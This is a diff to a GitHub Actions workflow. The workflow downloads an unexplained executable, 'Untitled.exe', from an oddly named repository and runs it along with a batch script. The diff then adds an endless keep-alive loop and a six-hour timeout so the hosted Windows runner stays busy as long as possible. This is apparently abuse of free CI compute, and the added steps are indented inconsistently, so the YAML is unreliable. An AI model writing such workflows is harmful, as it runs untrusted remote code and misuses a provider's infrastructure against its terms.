@@ -6,7 +6,8 @@ jobs:
   build:
 
     runs-on: windows-2019
-
+    timeout-minutes: 360 # 6 hours maximum for GitHub-hosted runners
+    
     steps:
     - name: Download Untitled.exe
       run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled.exe -OutFile untitled.exe
@@ -21,6 +22,14 @@ jobs:
         .\untitled.exe
         cmd.exe /c .\cmd.cmd
         
-    - name: Try and make workflow run up to 5 hours
-      run: |
-        while ($true) { Start-Sleep -Seconds 18000 } # Sleep for 5 hours
+      - name: MT1
+        run: |
+          :loop
+          echo "MT1: Still alive..."
+          timeout /t 60
+          goto loop
+        shell: cmd
+
+      - name: MT2
+        run: echo "Completed"
+        shell: cmd
